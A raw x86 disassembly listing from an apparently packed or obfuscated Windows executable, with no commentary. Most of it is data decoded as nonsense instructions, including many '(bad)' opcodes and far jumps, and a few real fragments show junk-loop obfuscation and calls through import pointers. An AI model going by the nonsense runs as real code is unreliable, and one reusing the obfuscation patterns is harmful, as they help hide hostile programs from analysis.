  403fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fe8:	jbe    0x403fe6
  403fea:	fsubr  QWORD PTR [ebx-0x16]
  403fed:	dec    esp
  403fee:	lods   eax,DWORD PTR ds:[esi]
  403fef:	lds    ebx,FWORD PTR [eax]
  403ff1:	ja     0x403f7d
  403ff3:	iret   
  403ff4:	xor    ebp,ebp
  403ff6:	xchg   ebx,eax
  403ff7:	(bad)  
  403ff8:	jmp    0x403f7b
  403ffa:	inc    esi
  403ffb:	dec    edx
  403ffc:	push   esp
  403ffd:	dec    edi
  403ffe:	icebp  
  403fff:	cmp    ebx,DWORD PTR [edi+ebp*2]
  404002:	mov    bh,0x33
  404004:	xchg   ebx,eax
  404005:	mov    al,0x9f
  404007:	std    
  404008:	push   esp
  404009:	jg     0x404008
  40400b:	and    eax,DWORD PTR [esp+eax*2]
  40400e:	push   es
  40400f:	jmp    0x2427:0xf1b13c1c
  404016:	daa    
  404017:	ficomp WORD PTR ds:0xded40fcc
  40401d:	scas   al,BYTE PTR es:[edi]
  40401e:	add    DWORD PTR [ecx+0x46802227],ecx
  404024:	cmc    
  404025:	repz into 
  404027:	dec    esp
  404028:	push   esi
  404029:	jmp    0xc270:0xc2880cac
  404030:	in     al,dx
  404031:	mov    ds:0x35f48d67,eax
  404036:	pop    ecx
  404037:	aam    0xa4
  404039:	adc    al,BYTE PTR [esi]
  40403b:	out    dx,al
  40403c:	push   eax
  40403d:	inc    ecx
  40403e:	fucomip st,st(7)
  404040:	cmp    eax,0x468cf5e9
  404045:	pop    edx
  404046:	cld    
  404047:	in     eax,dx
  404048:	mov    cl,bh
  40404a:	mov    esp,0x1ef6e978
  40404f:	inc    esi
  404050:	shl    bl,1
  404052:	in     al,dx
  404053:	aas    
  404054:	sub    DWORD PTR [ebp-0x5afcd4fb],ebx
  40405a:	cmp    al,0x9a
  40405c:	daa    
  40405d:	repnz fs leave 
  404060:	shr    cl,1
  404062:	mov    ah,0xcb
  404064:	neg    cl
  404066:	push   es
  404067:	push   0x3
  404069:	and    DWORD PTR [esi],ecx
  40406b:	push   ebp
  40406c:	mov    ebx,0x8dd0f31a
  404071:	scas   eax,DWORD PTR es:[edi]
  404072:	jmp    0x2a41:0xae96a720
  404079:	xchg   ebp,eax
  40407a:	js     0x40409f
  40407c:	mov    ebx,0xc6f30b37
  404081:	pop    edx
  404082:	test   BYTE PTR [esi],bh
  404084:	clc    
  404085:	sub    eax,0x917b797c
  40408a:	cmp    DWORD PTR [ebx+0x5bcb706],edx
  404090:	push   es
  404091:	mov    WORD PTR [ecx],?
  404093:	jecxz  0x40402e
  404095:	push   0x5a
  404097:	lods   eax,DWORD PTR ds:[esi]
  404098:	mov    esi,edx
  40409a:	cmp    DWORD PTR [ebp-0x6512abac],esp
  4040a0:	adc    esi,DWORD PTR [edi]
  4040a2:	xor    DWORD PTR [esi+0x51],edi
  4040a5:	test   BYTE PTR [ecx-0x3feb643b],al
  4040ab:	scas   al,BYTE PTR es:[edi]
  4040ac:	cmp    eax,0x34ad331a
  4040b1:	and    dl,bh
  4040b3:	sub    eax,0xbf926119
  4040b8:	test   dh,bh
  4040ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040bb:	cmp    DWORD PTR [edi-0x7f],ecx
  4040be:	jne    0x4040b4
  4040c0:	mov    ?,ebp
  4040c2:	add    eax,0x2b7e900
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xf7e6c1
  4040e3:	and    BYTE PTR [edx-0x66],bh
  4040e6:	sahf   
  4040e7:	es js  0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x4040c7
  4040ef:	xor    al,0x3d
  4040f1:	push   esp
  4040f2:	scas   al,BYTE PTR es:[edi]
  4040f3:	add    eax,0xd7635492
  4040f8:	jnp    0x4040f5
  4040fa:	sbb    BYTE PTR [esi],al
  4040fc:	xor    eax,eax
  4040fe:	lods   al,BYTE PTR ds:[esi]
  4040ff:	inc    eax
  404100:	popf   
  404101:	stos   BYTE PTR es:[edi],al
  404102:	mov    ch,BYTE PTR [edx]
  404104:	push   edx
  404105:	fstp   QWORD PTR [ecx+edx*2+0x39fe1735]
  40410c:	cmp    cl,BYTE PTR [ebp-0x78]
  40410f:	in     eax,dx
  404110:	push   ebp
  404111:	pop    edi
  404112:	out    0xac,eax
  404114:	int3   
  404115:	rcl    dl,1
  404117:	or     eax,0xb8448c36
  40411c:	(bad)  
  40411d:	arpl   WORD PTR [ebx],cx
  40411f:	or     ebx,ebx
  404121:	leave  
  404122:	dec    edx
  404123:	retf   
  404124:	push   edx
  404125:	xchg   al,dl
  404127:	(bad)  
  404128:	mov    dh,BYTE PTR [ebp+0x58]
  40412b:	push   cs
  40412c:	dec    eax
  40412d:	cmp    bh,BYTE PTR [edi]
  40412f:	or     ah,dh
  404131:	mov    cl,0x93
  404133:	pop    bp
  404135:	je     0x40412b
  404137:	je     0x4041aa
  404139:	jecxz  0x4041a3
  40413b:	ret    0x1a6d
  40413e:	sbb    al,0x88
  404140:	ja     0x4040ef
  404142:	or     ebx,eax
  404144:	daa    
  404145:	enter  0xedac,0x28
  404149:	retf   
  40414a:	mov    ebx,0x2b3e0f48
  40414f:	sbb    esp,DWORD PTR [eax+ebx*1+0x413fdab7]
  404156:	xor    eax,0xbcb770d8
  40415b:	and    DWORD PTR [ebp-0x54],0xab50ca36
  404162:	in     eax,0xc6
  404164:	hlt    
  404165:	mov    bl,0x2b
  404167:	push   esi
  404168:	iret   
  404169:	push   esi
  40416a:	scas   al,BYTE PTR es:[edi]
  40416b:	stos   BYTE PTR es:[edi],al
  40416c:	or     al,0x1e
  40416e:	ret    0xac9d
  404171:	mov    esi,0x43e67aa4
  404176:	xor    DWORD PTR [ecx+0xa],eax
  404179:	into   
  40417a:	mov    edx,DWORD PTR [edi+0x56]
  40417d:	jmp    0x1f8a:0x4aa42979
  404184:	mov    ecx,edi
  404186:	mov    esp,0x1ffad2e0
  40418b:	mov    edi,0xc3972213
  404190:	xchg   DWORD PTR [edi-0x71f4dd33],edi
  404196:	scas   al,BYTE PTR es:[edi]
  404197:	xchg   BYTE PTR [ecx],dl
  404199:	out    0x1f,al
  40419b:	fs add bl,0x22
  40419f:	jl     0x404199
  4041a1:	pusha  
  4041a2:	adc    al,0xbc
  4041a4:	push   esi
  4041a5:	mov    ah,0x2e
  4041a7:	pop    DWORD PTR [eax+0x621a2306]
  4041ad:	inc    ecx
  4041ae:	pop    ecx
  4041af:	cdq    
  4041b0:	sbb    ebx,DWORD PTR [ebx+ebp*8+0x6b3672b7]
  4041b7:	gs or  dl,dl
  4041ba:	retf   0x520c
  4041bd:	jmp    0x40422d
  4041bf:	shr    BYTE PTR [esi+0x79126910],1
  4041c5:	mov    edi,0x3585a527
  4041ca:	add    bh,BYTE PTR [ecx+ecx*2-0x53]
  4041ce:	arpl   bp,ax
  4041d0:	dec    esp
  4041d1:	sbb    BYTE PTR [edx],bl
  4041d3:	imul   ebx,esi,0x54
  4041d6:	or     BYTE PTR ds:0x6a49de47,bl
  4041dc:	ins    DWORD PTR es:[edi],dx
  4041dd:	pusha  
  4041de:	das    
  4041df:	or     al,0x68
  4041e1:	pop    ds
  4041e2:	iret   
  4041e3:	inc    eax
  4041e4:	aad    0x13
  4041e6:	adc    DWORD PTR [ecx+0x55],ebx
  4041e9:	rcr    edx,1
  4041eb:	sub    BYTE PTR [edi-0x33],ch
  4041ee:	fisub  WORD PTR [ecx+0x59]
  4041f1:	inc    ecx
  4041f2:	mov    DWORD PTR [esi],ebx
  4041f4:	cmp    DWORD PTR [edi-0x60],eax
  4041f7:	xlat   BYTE PTR ds:[ebx]
  4041f8:	icebp  
  4041f9:	xchg   BYTE PTR [eax],bl
  4041fb:	call   FWORD PTR [eax+0x37]
  4041fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ff:	mov    ebp,DWORD PTR [edx+0x33]
  404202:	das    
  404203:	push   esp
  404204:	and    al,0x96
  404206:	ins    BYTE PTR es:[edi],dx
  404207:	xor    ah,al
  404209:	mov    ah,0xc
  40420b:	rol    DWORD PTR [esi],1
  40420d:	pop    DWORD PTR [eax+ecx*2+0x3762f6a1]
  404214:	pushf  
  404215:	jnp    0x4041e6
  404217:	sbb    edi,ebp
  404219:	sbb    al,0xf3
  40421b:	jbe    0x404205
  40421d:	ret    0xd773
  404220:	jl     0x4041c0
  404222:	test   esi,ebx
  404224:	jmp    0x404250
  404226:	call   0x9630:0xc2a37879
  40422d:	pushf  
  40422e:	arpl   WORD PTR [esi+edi*8-0x2a],di
  404232:	jecxz  0x4041c4
  404234:	dec    esi
  404235:	xchg   DWORD PTR [ebp+0x644cfcb4],ecx
  40423b:	popw   ds
  40423d:	ds mov edi,0x1320be46
  404243:	ret    
  404244:	xor    bh,ah
  404246:	ss inc edi
  404248:	pop    esi
  404249:	jns    0x40428e
  40424b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40424c:	lods   al,BYTE PTR ds:[esi]
  40424d:	mov    dl,0x41
  40424f:	push   esi
  404250:	cli    
  404251:	leave  
  404252:	jns    0x4041e0
  404254:	dec    edi
  404255:	fcmove st,st(7)
  404257:	stos   BYTE PTR es:[edi],al
  404258:	or     edi,DWORD PTR [edx]
  40425a:	(bad)  [eax]
  40425c:	test   DWORD PTR [ecx+ebx*2],esp
  40425f:	sub    esi,DWORD PTR [ecx+0x51f9bc91]
  404265:	inc    ebx
  404266:	and    ebx,esp
  404268:	fs (bad) 
  40426a:	gs ins BYTE PTR es:[edi],dx
  40426c:	inc    edi
  40426d:	cmp    DWORD PTR [eax-0x59],0x5b
  404271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404272:	sub    ah,dh
  404274:	adc    BYTE PTR [eax+0x6d],cl
  404277:	jns    0x404226
  404279:	push   edi
  40427a:	out    0x23,eax
  40427c:	bound  ecx,QWORD PTR [eax-0x135e557c]
  404282:	xchg   edi,eax
  404283:	pop    es
  404284:	clc    
  404285:	popa   
  404286:	mov    esi,0x6804fc9f
  40428b:	dec    BYTE PTR [edi]
  40428d:	aaa    
  40428e:	outs   dx,BYTE PTR ds:[esi]
  40428f:	adc    al,0x89
  404291:	pop    ebp
  404292:	xchg   BYTE PTR ss:[edi+0x68ee702f],ch
  404299:	fwait
  40429a:	in     al,dx
  40429b:	hlt    
  40429c:	add    al,0x15
  40429e:	jae    0x404229
  4042a0:	(bad)  [ebp+edi*4+0x2e]
  4042a4:	bound  edx,QWORD PTR ds:0xe03a7631
  4042aa:	xchg   ebp,eax
  4042ab:	call   0xaa08e02e
  4042b0:	(bad)  
  4042b1:	dec    eax
  4042b2:	mov    bh,0x4a
  4042b4:	dec    ecx
  4042b5:	je     0x4042ad
  4042b7:	pop    ds
  4042b8:	sub    ch,BYTE PTR [eax+eax*4+0x40]
  4042bc:	jg     0x4042b5
  4042be:	fldenv [ebx]
  4042c0:	mov    bl,0x16
  4042c2:	pop    edx
  4042c3:	test   al,0x2
  4042c5:	cdq    
  4042c6:	mov    BYTE PTR [ebx-0x3c5fe8dd],al
  4042cc:	or     DWORD PTR ds:0x6653f29d,esp
  4042d2:	push   0x96353bce
  4042d7:	xor    DWORD PTR [edx-0x7c],edi
  4042da:	iret   
  4042db:	cdq    
  4042dc:	stc    
  4042dd:	xchg   ecx,eax
  4042de:	sub    BYTE PTR [edi],cl
  4042e0:	mov    dl,0x68
  4042e2:	scas   al,BYTE PTR es:[edi]
  4042e3:	sub    BYTE PTR [ecx],ah
  4042e5:	cli    
  4042e6:	int3   
  4042e7:	test   al,0x3d
  4042e9:	or     esp,DWORD PTR [edx]
  4042eb:	mov    dh,0x5
  4042ed:	pop    esp
  4042ee:	mov    bh,ah
  4042f0:	les    edx,FWORD PTR [ebx+0x14]
  4042f3:	mov    bl,0x1a
  4042f5:	(bad)  
  4042f6:	not    BYTE PTR [edx-0x68]
  4042f9:	push   ecx
  4042fa:	test   eax,0x695902b0
  4042ff:	ja     0x404364
  404301:	cdq    
  404302:	xchg   esp,eax
  404303:	xor    DWORD PTR [esi],edx
  404305:	mov    ch,0x59
  404307:	jecxz  0x40435e
  404309:	jmp    esp
  40430b:	outs   dx,BYTE PTR ds:[esi]
  40430c:	pop    es
  40430d:	pop    ds
  40430e:	jmp    0x404296
  404310:	dec    ebx
  404311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404312:	sti    
  404313:	pusha  
  404314:	mov    bl,0xfe
  404316:	aaa    
  404317:	mov    eax,0xdea43e14
  40431c:	inc    ecx
  40431d:	(bad)  
  40431f:	pop    ebx
  404320:	lar    edi,WORD PTR [esi]
  404323:	mov    dh,0x9f
  404325:	(bad)  
  404326:	or     esp,DWORD PTR ds:0x7a1d1e72
  40432c:	jmp    FWORD PTR [ecx+0x70]
  40432f:	pop    edx
  404330:	jbe    0x4042f4
  404332:	gs dec edi
  404334:	sub    BYTE PTR [esi+0x6d],dl
  404337:	adc    BYTE PTR [edx-0x4d],dh
  40433a:	sub    edi,DWORD PTR gs:[esi]
  40433d:	jmp    0x3b19c905
  404342:	cdq    
  404343:	in     eax,dx
  404344:	add    BYTE PTR [ecx],dl
  404346:	aad    0xda
  404348:	cdq    
  404349:	fs (bad) 
  40434b:	imul   DWORD PTR [edi]
  40434d:	or     eax,0xb6a28619
  404352:	or     eax,0x3ee62b62
  404357:	lods   eax,DWORD PTR ds:[esi]
  404358:	and    eax,0x2fe02ce9
  40435d:	repnz (bad) 
  40435f:	mov    al,0x98
  404361:	dec    edx
  404362:	call   0x5be256a3
  404367:	inc    eax
  404368:	inc    edi
  404369:	inc    ebx
  40436a:	mov    ss,WORD PTR [ebx+0x6994384e]
  404370:	mov    DWORD PTR [eax],ecx
  404372:	mov    eax,DWORD PTR [ebp+0xc]
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	(bad)  
  40441a:	push   ebx
  40441b:	jno    0x40445f
  40441d:	sbb    al,0x2b
  40441f:	js     0x404499
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x4043ff
  404426:	in     al,0xd6
  404428:	aad    0x3c
  40442a:	pop    ebp
  40442b:	pop    ebp
  40442c:	stos   DWORD PTR es:[edi],eax
  40442d:	pusha  
  40442e:	jmp    0x4a9213dc
  404433:	mov    ebx,0x4188e853
  404438:	add    al,0x18
  40443a:	imul   ecx,DWORD PTR [ecx-0x3b],0x3a
  40443e:	scas   eax,DWORD PTR es:[edi]
  40443f:	fistp  QWORD PTR [ecx-0x3970644c]
  404445:	dec    ecx
  404446:	jnp    0x404488
  404448:	bound  eax,QWORD PTR [ebx]
  40444a:	and    BYTE PTR [ecx*2-0x56c417b3],0xc9
  404452:	aam    0xb7
  404454:	ret    
  404455:	(bad)  
  404456:	cmp    al,0x6
  404458:	gs dec esi
  40445a:	mov    ah,0x8b
  40445c:	push   ss
  40445d:	xor    eax,0xbeb9e004
  404462:	push   ds
  404463:	push   ebx
  404464:	mov    dh,0x6f
  404466:	mov    ch,0xd3
  404468:	imul   ecx,DWORD PTR [edi-0x2671351],0x5981898b
  404472:	jle    0x404439
  404474:	retf   
  404475:	mov    esp,0xe0fe6e3c
  40447a:	mov    edi,0x34f21028
  40447f:	js     0x4044c0
  404481:	jns    0x404424
  404483:	dec    esp
  404484:	sbb    BYTE PTR [edx+0x1ed411d0],bl
  40448a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40448b:	xchg   DWORD PTR [ebp+0x4c],esp
  40448e:	loope  0x4044b0
  404490:	(bad)  
  404491:	cmp    bh,BYTE PTR [eax+0x2a02d1fd]
  404497:	mov    ebp,0xf53fadfc
  40449c:	xchg   edx,eax
  40449d:	or     eax,0x413cf82c
  4044a2:	in     eax,dx
  4044a3:	cmp    ch,dh
  4044a5:	leave  
  4044a6:	jl     0x4044b3
  4044a8:	cmp    esp,0xe5ca7edd
  4044ae:	xor    dh,BYTE PTR [eax]
  4044b0:	lods   eax,DWORD PTR ds:[esi]
  4044b1:	jae    0x404521
  4044b3:	fild   DWORD PTR [ebx+0x3b4cd530]
  4044b9:	jb     0x4044f4
  4044bb:	jo     0x4044c2
  4044bd:	ss jb  0x404461
  4044c0:	mov    eax,0xe49c87fa
  4044c5:	jne    0x404543
  4044c7:	imul   ebp,DWORD PTR [esi],0x37
  4044ca:	test   DWORD PTR [esi-0x2fce213c],ecx
  4044d0:	mov    ah,0x29
  4044d2:	add    bl,BYTE PTR [ecx+eax*1-0x38]
  4044d6:	push   eax
  4044d7:	mov    ebp,DWORD PTR [eax]
  4044d9:	adc    bl,BYTE PTR [eax+0x1f8ebaea]
  4044df:	jno    0x404536
  4044e1:	push   ecx
  4044e2:	stos   DWORD PTR es:[edi],eax
  4044e3:	dec    edi
  4044e4:	ja     0x404474
  4044e6:	jnp    0x404541
  4044e8:	xor    bh,cl
  4044ea:	push   edi
  4044eb:	push   ecx
  4044ec:	cli    
  4044ed:	dec    eax
  4044ee:	push   ebp
  4044ef:	cmp    DWORD PTR ds:0x9a8ecfdb,eax
  4044f5:	mov    edi,0x5e53d2af
  4044fa:	retf   
  4044fb:	jle    0x404560
  4044fd:	ss pop ebp
  4044ff:	dec    ebx
  404500:	or     DWORD PTR [ebx+0xe4430eb],esi
  404506:	pop    edx
  404507:	leave  
  404508:	push   ebx
  404509:	or     esp,DWORD PTR [esi-0x2f]
  40450c:	jb     0x4044d4
  40450e:	mov    ch,BYTE PTR [edi-0x61]
  404511:	mov    ebx,0xf5df251b
  404516:	cwde   
  404517:	jae    0x404582
  404519:	mov    ebx,0x66756069
  40451e:	dec    esi
  40451f:	mov    cs,WORD PTR [ecx+0x44]
  404522:	add    eax,0xd1d9826c
  404527:	icebp  
  404528:	push   0xffffffed
  40452a:	pop    ebx
  40452b:	and    al,0xae
  40452d:	in     eax,dx
  40452e:	iret   
  40452f:	fild   QWORD PTR ds:0x473aba81
  404535:	sahf   
  404536:	jl     0x404571
  404538:	jno    0x404597
  40453a:	push   ecx
  40453b:	xor    al,BYTE PTR [ecx-0x39]
  40453e:	mov    eax,0x3cfe04cc
  404543:	adc    eax,0x1a7e5b83
  404548:	jb     0x40450f
  40454a:	sar    DWORD PTR [edx*8+0x52db74c0],cl
  404551:	test   eax,0x32cdaeb5
  404556:	outs   dx,DWORD PTR ds:[esi]
  404557:	js     0x404523
  404559:	popa   
  40455a:	and    ebp,ebx
  40455c:	mov    ecx,0x1a6f7002
  404561:	mul    ebx
  404563:	jno    0x40450f
  404565:	add    al,0x70
  404567:	adc    DWORD PTR [edi+0x73af02e1],edi
  40456d:	call   0x605595ce
  404572:	pusha  
  404573:	mov    esi,0xd7f1827e
  404578:	shl    BYTE PTR [edi-0x5d],cl
  40457b:	enter  0x400d,0x9b
  40457f:	fimul  DWORD PTR [edx-0x56]
  404582:	and    al,0xfd
  404584:	jmp    0x4045c6
  404586:	loopne 0x404510
  404588:	add    DWORD PTR [ebx-0x6c6519ca],0xffffffb3
  40458f:	dec    ebp
  404590:	pop    ds
  404591:	mov    DWORD PTR [ebx-0x68],edx
  404594:	pop    edi
  404595:	push   cs
  404596:	out    0xb5,eax
  404598:	shl    BYTE PTR [ebx-0x31],0x72
  40459c:	pop    ds
  40459d:	inc    esi
  40459e:	jge    0x4045b4
  4045a0:	arpl   WORD PTR [ecx-0x63c72ae7],bp
  4045a6:	xor    ebp,ebp
  4045a8:	push   0xffffffd1
  4045aa:	test   BYTE PTR [edi+0x519b3651],al
  4045b0:	pusha  
  4045b1:	mov    eax,ds:0xf53d17af
  4045b6:	adc    ecx,DWORD PTR [edx+0x64e1adc9]
  4045bc:	out    0x54,eax
  4045be:	rol    BYTE PTR [esi+0xb],1
  4045c1:	cdq    
  4045c2:	xor    edi,ebp
  4045c4:	push   0xffffff84
  4045c6:	dec    eax
  4045c7:	test   dl,bh
  4045c9:	pop    eax
  4045ca:	lds    esi,FWORD PTR [edi+esi*8-0x6614da36]
  4045d1:	mov    DWORD PTR [esi],0xef609aab
  4045d7:	and    BYTE PTR [eax-0x25],dh
  4045da:	add    cl,0xc7
  4045dd:	adc    BYTE PTR [esi+0x2abb4f50],ah
  4045e3:	xchg   ecx,eax
  4045e4:	and    DWORD PTR [esi+0x5c],0x5b
  4045e8:	mov    dl,0x59
  4045ea:	pusha  
  4045eb:	and    al,0xc0
  4045ed:	fs jmp 0x40464a
  4045f0:	jno    0x4045ac
  4045f2:	xchg   edi,eax
  4045f3:	imul   esi,DWORD PTR [edi],0xffffffe1
  4045f6:	pop    ebp
  4045f7:	(bad)  
  4045f8:	xor    edx,esi
  4045fa:	sub    ah,BYTE PTR [edx-0x130aff34]
  404600:	aas    
  404601:	fbstp  TBYTE PTR [si]
  404604:	jnp    0x40461e
  404606:	mov    esp,0xc6c439d9
  40460b:	sub    DWORD PTR [ecx],eax
  40460d:	mov    dh,0x59
  40460f:	and    BYTE PTR [ecx-0x68b9c014],cl
  404615:	pop    edx
  404616:	sbb    BYTE PTR [esi-0x42],0xd8
  40461a:	inc    esi
  40461b:	int    0xfe
  40461d:	retf   
  40461e:	and    DWORD PTR [esi+0x6b],edx
  404621:	push   edi
  404622:	add    DWORD PTR [ecx+0x79e02c5e],0x9c814f0e
  40462c:	out    dx,al
  40462d:	enter  0xbe66,0x2c
  404631:	dec    ebp
  404632:	fisubr DWORD PTR [esi+eax*8-0x20]
  404636:	push   0x3d4e1353
  40463b:	cdq    
  40463c:	call   0xdb219b3a
  404641:	or     al,0xba
  404643:	mov    eax,DWORD PTR [edx+edi*4+0xdbaee13]
  40464a:	jae    0x4045fe
  40464c:	and    BYTE PTR [ecx-0x77],0xda
  404650:	je     0x404682
  404652:	dec    edx
  404653:	push   ecx
  404654:	jp     0x4045db
  404656:	sar    DWORD PTR [esp-0x629c5501],cl
  40465d:	pop    esp
  40465e:	inc    eax
  40465f:	pusha  
  404660:	cmp    ebp,DWORD PTR [eax-0x21242b87]
  404666:	or     eax,0xa47ea0be
  40466b:	(bad)  
  40466c:	pusha  
  40466d:	xchg   DWORD PTR [esp+ebp*8+0x5e147a41],edx
  404674:	imul   ebx,DWORD PTR [esi+0x1f],0x77
  404678:	loop   0x404662
  40467a:	fcomp  DWORD PTR [edi+0x48448ba7]
  404680:	sbb    BYTE PTR [eax+eiz*2-0x31],ch
  404684:	ins    BYTE PTR es:[edi],dx
  404685:	mov    esp,0x64eea07f
  40468a:	lods   al,BYTE PTR ds:[esi]
  40468b:	ret    
  40468c:	pop    ds
  40468d:	inc    esp
  40468e:	lods   al,BYTE PTR ds:[esi]
  40468f:	pop    edx
  404690:	repnz mov al,ds:0x8e36b4ce
  404696:	xor    al,0xb7
  404698:	dec    eax
  404699:	adc    dl,bh
  40469b:	push   ds
  40469c:	and    ch,bl
  40469e:	jecxz  0x4046ae
  4046a0:	arpl   WORD PTR [esi-0x4f],si
  4046a3:	cld    
  4046a4:	leave  
  4046a5:	retf   
  4046a6:	push   edx
  4046a7:	pop    eax
  4046a8:	or     eax,0xa853e963
  4046ad:	cwde   
  4046ae:	in     al,dx
  4046af:	sahf   
  4046b0:	or     ah,bh
  4046b2:	mov    eax,ds:0xd134f7ee
  4046b7:	mov    edi,DWORD PTR [edx+0x7f]
  4046ba:	push   edi
  4046bb:	add    edi,DWORD PTR [eax]
  4046bd:	sti    
  4046be:	jg     0x404690
  4046c0:	pop    ebx
  4046c1:	lods   eax,DWORD PTR ds:[esi]
  4046c2:	addr16 jbe 0x40464b
  4046c5:	inc    edx
  4046c6:	xchg   ebx,eax
  4046c7:	(bad)  
  4046c8:	adc    eax,0xa8cf6dd3
  4046cd:	push   0x3c07f8c9
  4046d2:	mov    bl,0x9
  4046d4:	scas   al,BYTE PTR es:[edi]
  4046d5:	repnz ror BYTE PTR [edx-0x213a644c],1
  4046dc:	pusha  
  4046dd:	jmp    0x4046cb
  4046df:	xchg   ecx,eax
  4046e0:	xor    eax,0x4c4ae61d
  4046e5:	xchg   ecx,eax
  4046e6:	lds    eax,FWORD PTR [esi-0x1f06b636]
  4046ec:	push   edi
  4046ed:	jne    0x40475f
  4046ef:	call   DWORD PTR [edi-0x56]
  4046f2:	dec    ebp
  4046f3:	pmullw mm1,QWORD PTR [esp+ecx*4]
  4046f7:	ds push esi
  4046f9:	and    DWORD PTR ds:0x42a775,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x42d983de
  404770:	call   0x4d78:0x782971ef
  404777:	jle    0x4047f1
  404779:	js     0x4047f9
  40477b:	fisttp DWORD PTR [ecx]
  40477d:	mov    esp,0x75bc0467
  404782:	shr    eax,1
  404784:	adc    al,0xa5
  404786:	push   ds
  404787:	ds xchg edx,eax
  404789:	push   ecx
  40478a:	inc    ebx
  40478b:	pop    edx
  40478c:	xor    al,cl
  40478e:	xchg   edi,eax
  40478f:	pop    ebp
  404790:	sbb    ebx,edx
  404792:	push   esi
  404793:	fldcw  WORD PTR [ebx-0x10a19c25]
  404799:	or     BYTE PTR [edi+esi*4-0x59],bh
  40479d:	mov    bl,0x68
  40479f:	jg     0x40481b
  4047a1:	(bad)  
  4047a2:	push   edx
  4047a3:	jno    0x40477e
  4047a5:	xchg   ebp,eax
  4047a6:	mov    ah,BYTE PTR [edi+ecx*1]
  4047a9:	rcl    DWORD PTR [edi+0x41],0x86
  4047ad:	es daa 
  4047af:	lds    eax,FWORD PTR [edx-0x64]
  4047b2:	inc    edx
  4047b3:	sbb    ah,bh
  4047b5:	push   ds
  4047b6:	mov    ecx,DWORD PTR [esi+eax*8+0x17]
  4047ba:	jl     0x404801
  4047bc:	mov    edi,0xc82d4458
  4047c1:	dec    edi
  4047c2:	inc    DWORD PTR [ebp+eiz*8+0xa]
  4047c6:	rol    BYTE PTR [edx-0x76],1
  4047c9:	or     cl,BYTE PTR [esi-0x18]
  4047cc:	call   0xd878f78e
  4047d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047d2:	les    ebx,FWORD PTR [ecx+0x42b1cb59]
  4047d8:	xor    al,0xf4
  4047da:	mov    edx,0x20ab6599
  4047df:	push   edx
  4047e0:	mov    ds:0xcc93690a,al
  4047e5:	sub    al,0x8b
  4047e7:	and    eax,0xf582f1f6
  4047ec:	dec    esp
  4047ed:	(bad)  
  4047ee:	(bad)  
  4047ef:	jne    0x404845
  4047f1:	and    ah,BYTE PTR [eax-0x12]
  4047f4:	popa   
  4047f5:	jge    0x40481c
  4047f7:	or     DWORD PTR [edi+0x3f],ebp
  4047fa:	aad    0x81
  4047fc:	mov    ah,0x9
  4047fe:	test   DWORD PTR [ecx],esi
  404800:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  404802:	rol    DWORD PTR [esi+ecx*8],1
  404805:	out    0x1f,eax
